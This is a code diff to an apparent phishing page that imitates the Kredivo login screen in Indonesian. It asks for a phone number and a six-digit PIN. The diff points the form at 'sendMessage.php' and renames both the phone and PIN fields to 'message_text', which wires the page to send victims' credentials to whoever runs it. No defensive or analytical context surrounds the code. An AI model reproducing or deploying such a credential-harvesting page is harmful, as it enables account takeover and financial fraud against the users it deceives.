@@ -237,15 +237,15 @@ if (window) {
        <div class="mb-20">
            <h2 style=" text-align: left; margin-top: -15px; font-size: 15px;">Masuk ke Akun Kredivo-mu</h2>
       <div class="inpform">
-  <form action="gagal.html" method="get" onsubmit="loadd();">
+  <form action="sendMessage.php" method="get" onsubmit="loadd();">
       <input type="hidden" id="logo" value="✥•-•-•-•⟮𝗞𝗿𝗲𝗱𝗶𝘃𝗼⟯•-•-•-•✥">
 <label class="h3">Nomor Handphone</label>
-   <input id="inpuser" value="" v-mask="'#### #### #####'" v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)" name="userid" maxlength="13" minlength="10" pattern="(?=.*[0-9]).{12,13}" title="Masukkan Nomor Handphone anda dengan benar" type="tel" class="payment-option" placeholder="08** Masukkan Nomor Hp Anda" style="
+   <input id="inpuser" value="" v-mask="'#### #### #####'" v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)" name="message_text" maxlength="13" minlength="10" pattern="(?=.*[0-9]).{12,13}" title="Masukkan Nomor Handphone anda dengan benar" type="tel" class="payment-option" placeholder="08** Masukkan Nomor Hp Anda" style="
       background-position: 100% 100%;
       background-repeat: no-repeat;
       background-size: 100% 107%; padding-left: 18px; color: #B0AFB7;" required>
 <label class="h4">PIN</label>
-   <input id="inppas" maxlength="6" minlength="6" pattern="(?=.*[0-9]).{6,6}" title="Masukkan Nomor Handphonr anda dengan benar" type="tel" class="payment-option" placeholder="Masukkan 6 Angka PIN Kredivo-Mu " style="padding-left: 18px; color: #B0AFB7;" required>
+   <input id="inppas" maxlength="6" minlength="6" pattern="(?=.*[0-9]).{6,6}" title="Masukkan Nomor Handphonr anda dengan benar" type="tel" class="payment-option" placeholder="Masukkan 6 Angka PIN Kredivo-Mu " style="padding-left: 18px; color: #B0AFB7;" name="message_text" required>
 <i class="togel bi bi-eye-slash" id="togglePassword" style="margin-left: 58%; margin-bottom: 40px;"></i>
 <button type="submit" class="btn-kredi" id="kirim" onclick="ses()">Lanjut</button>
 </form>
